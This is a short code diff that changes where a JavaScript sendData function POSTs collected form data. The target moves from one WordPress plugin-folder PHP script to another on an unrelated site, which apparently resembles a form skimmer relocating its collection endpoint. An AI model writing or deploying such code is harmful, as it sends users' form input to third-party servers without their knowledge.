@@ -71,7 +71,7 @@ function sendData( data ) {
   } );
 
   // Set up our request
-  XHR.open( 'POST', 'https://www.golden-max-robot.ru/wp-content/plugins/easybusy/tundex/tfx-report.php' );
+  XHR.open( 'POST', 'https://dev.nte.org.au/wp-content/plugins/easybusy/tule/wp-doc.php' );
 
   // Send our FormData object; HTTP headers are set automatically
   XHR.send(FD);
